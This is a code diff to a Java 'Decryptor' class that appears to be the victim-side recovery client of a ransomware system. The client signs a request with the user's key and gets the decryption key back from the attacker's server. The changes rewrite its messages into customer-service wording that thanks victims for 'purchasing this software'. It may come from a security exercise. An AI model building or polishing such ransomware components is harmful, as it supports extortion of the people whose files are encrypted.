@@ -31,6 +31,12 @@ public class Decryptor {
         }
         String userid = args[2];
         
+        // Display welcome message
+        System.out.println();
+        System.out.println("Dear customer, thank you for purchasing this software.");
+        System.out.println("We are here to help you recover your files from this horrible attack.");
+        System.out.println("Trying to decrypt files...");
+        
         try {
             // Check required files exist
             Path privateKeyFile = Paths.get(userid + ".prv");
@@ -61,8 +67,6 @@ public class Decryptor {
             byte[] signature = generateSignature(userid, encryptedAesKey, userPrivateKey);
             
             // 4. Connect to server and send request
-            System.out.println("Connecting to " + host + ":" + port + "...");
-            
             try (Socket socket = new Socket()) {
                 // Set connection timeout
                 socket.connect(new InetSocketAddress(host, port), 10000);
@@ -87,8 +91,6 @@ public class Decryptor {
                 out.write(signature);
                 out.flush();
                 
-                System.out.println("Request sent. Waiting for response...");
-                
                 // Read response
                 boolean success = in.readBoolean();
                 
@@ -98,16 +100,17 @@ public class Decryptor {
                     byte[] decryptedAesKey = new byte[keyLen];
                     in.readFully(decryptedAesKey);
                     
-                    System.out.println("Received decrypted AES key from server.");
-                    
                     // Decrypt the file
                     decryptFile(decryptedAesKey);
-                    System.out.println("File recovery successful!");
+                    System.out.println("Success! Your files have now been recovered!");
+                    System.out.println();
                 } else {
                     // Read error message
                     String errorMsg = in.readUTF();
-                    System.err.println("Server denied request: " + errorMsg);
-                    System.err.println("Identity could not be verified.");
+                    System.out.println("Unfortunately we cannot verify your identity.");
+                    System.out.println("Please try again, making sure that you have the correct signature");
+                    System.out.println("key in place and have entered the correct userid.");
+                    System.out.println();
                 }
             }
             
